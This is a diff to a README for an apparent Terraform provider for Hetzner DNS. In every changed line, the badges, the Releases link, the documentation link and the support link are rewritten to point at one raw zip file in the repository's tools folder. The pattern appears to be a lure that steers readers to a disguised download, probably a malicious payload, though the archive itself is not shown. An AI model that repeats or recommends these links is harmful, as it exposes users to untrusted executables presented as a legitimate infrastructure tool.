@@ -1,6 +1,6 @@
 # Terraform Provider for Hetzner DNS 🌐
 
-![GitHub Release](https://img.shields.io/github/release/Raouf213/terraform-provider-hetznerdns.svg) ![License](https://img.shields.io/github/license/Raouf213/terraform-provider-hetznerdns.svg)
+![GitHub Release](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip) ![License](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip)
 
 Welcome to the **Terraform Provider for Hetzner DNS**! This provider allows you to manage DNS records using Terraform with Hetzner's DNS services. Whether you are setting up a new domain or managing existing records, this provider simplifies the process.
 
@@ -24,7 +24,7 @@ Welcome to the **Terraform Provider for Hetzner DNS**! This provider allows you 
 
 ## Installation
 
-To install the Terraform provider for Hetzner DNS, you can download the latest release from our [Releases page](https://github.com/Raouf213/terraform-provider-hetznerdns/releases). 
+To install the Terraform provider for Hetzner DNS, you can download the latest release from our [Releases page](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip). 
 
 Once downloaded, follow these steps:
 
@@ -76,7 +76,7 @@ The following resources are available with this provider:
 - `hetznerdns_record`: Manage DNS records.
 - `hetznerdns_zone`: Manage DNS zones.
 
-For detailed information on each resource, refer to the [documentation](https://github.com/Raouf213/terraform-provider-hetznerdns/releases).
+For detailed information on each resource, refer to the [documentation](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip).
 
 ## Contributing
 
@@ -95,6 +95,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need support, feel free to reach out through the GitHub issues page. You can also check the [Releases section](https://github.com/Raouf213/terraform-provider-hetznerdns/releases) for updates and new features.
+If you have any questions or need support, feel free to reach out through the GitHub issues page. You can also check the [Releases section](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip) for updates and new features.
 
 Thank you for using the Terraform Provider for Hetzner DNS! Happy coding!
